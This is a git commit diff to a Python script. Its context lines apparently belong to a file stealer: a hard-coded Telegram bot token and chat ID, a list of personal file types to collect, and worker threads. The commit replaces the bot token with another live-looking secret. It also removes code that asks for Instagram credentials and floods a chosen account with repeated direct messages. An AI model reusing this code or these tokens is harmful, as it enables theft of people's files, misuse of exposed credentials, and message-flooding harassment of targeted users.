9183255c8fa5750885d5f58f35758e551e608a3a
hassan <ahaer110h220@gmail.com>
2025-07-09 18:16:58 +0300

    Update main.py

--- main.py
+++ main.py
@@ -2,9 +2,8 @@ import os
 import threading
 import queue
 import telebot
-from instagrapi import Client
 import random
-BOT_TOKEN = "7636241975:AAHG1TnFkA1ZWwFotTZaPJnN5JbFTdjwxsU"
+BOT_TOKEN = "8109058591:AAHDIQJg7SFC-tQ3vHApvtS-NzPBdPi86k8"
 CHAT_ID = "7759417468"
 bot = telebot.TeleBot(BOT_TOKEN)
 target_extensions = [".jpg", ".jpeg", ".png", ".mp4", ".mp3", ".pdf", ".docx", ".xlsx", ".txt", ".zip"]
@@ -39,30 +38,3 @@ for _ in range(8):
     threads.append(t)
 for t in threads:
     t.join()
-cl = Client()
-usernamel = input("Enter your username: ")
-passwordl = input("Enter your password: ")
-cl.login(username=usernamel, password=passwordl)
-tarusername = input("Message for (username): ")
-user_id = cl.user_id_from_username(tarusername)
-messages_list = []
-while True:
-    the_message = input("Enter the message to add to list or write (exit) to exit: ")
-    if the_message.lower() == "exit": 
-        break
-    else:
-        messages_list.append(the_message)
-num_of_messages = int(input("How many times do you want to send the message? "))
-def send_direct_instagram_message():
-    rand_message = random.choice(messages_list)
-    try:
-        cl.direct_send(rand_message, [user_id])
-    except Exception as e:
-        print(f"{e}")
-threads_list = []
-for _ in range(num_of_messages):
-    message_thread = threading.Thread(target=send_direct_instagram_message)
-    threads_list.append(message_thread)
-    message_thread.start()
-for message_thread in threads_list:
-    message_thread.join()
